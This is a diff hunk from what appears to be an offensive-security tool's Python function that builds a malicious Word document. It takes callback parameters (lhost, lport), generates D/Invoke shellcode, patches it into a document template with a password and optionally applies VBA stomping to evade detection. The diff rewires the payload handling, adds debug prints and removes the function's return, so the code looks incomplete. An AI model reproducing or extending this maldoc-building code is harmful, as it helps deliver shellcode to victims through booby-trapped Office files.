@@ -1177,36 +1177,32 @@ def generate_word_pingback_aes(lhost, lport, proxy, id, stomp_version, template_
 
     payload_entry = generate_dinvoke_x64_x86(payloads)
 
-    if isinstance(payload_entry, str):
-        with open(f"{PAYLOAD_DIR}/{payload_entry}", 'rb') as f:
-            shellcode = f.read()
-    elif isinstance(payload_entry, bytes):
-        shellcode = payload_entry
-    else:
-        raise ValueError("Unsupported shellcode payload type")
+    # if isinstance(payload_entry, str):
+    #     with open(f"{payload_entry}", 'rb') as f:
+    #         shellcode = f.read()
+    # elif isinstance(payload_entry, bytes):
+    #     shellcode = payload_entry
+    # else:
+    #     raise ValueError("Unsupported shellcode payload type")
 
-    # password = str(uuid.uuid4()).replace('-', '')
-
-    with NamedTemporaryFile(delete=False) as shellcode_file:
-        shellcode_path = pathlib.Path(shellcode_file.name)
-        shellcode_file.write(shellcode)
+    # with NamedTemporaryFile(delete=False) as shellcode_file:
+    #     shellcode_path = pathlib.Path(shellcode_file.name)
+    #     shellcode_file.write(shellcode)
 
     doc_path = pathlib.Path(template_path)
-    with NamedTemporaryFile(delete=False) as output_file:
-        output_path = pathlib.Path(output_file.name)
+    output_path = pathlib.Path(output_file_path)
 
-    # shellcode_path = pathlib.Path("/tmp/loader.bin")
-
-    patch_document(doc_path, shellcode_path, output_path, password)
+    print(f"patch_document({doc_path=}, {payload_entry=}, {output_path=}, {password=})")
+    patch_document(doc_path, payload_entry, output_path, password)
 
     if not stomp_version:
+        print("not_stomping:")
         with open(output_path, 'rb') as f:
             retval = f.read()
     else:
+        print("stomping:")
         with open(stomp_doc(output_path, stomp_version), 'rb') as f:
             retval = f.read()
-    return BytesIO()
-
 
 
 
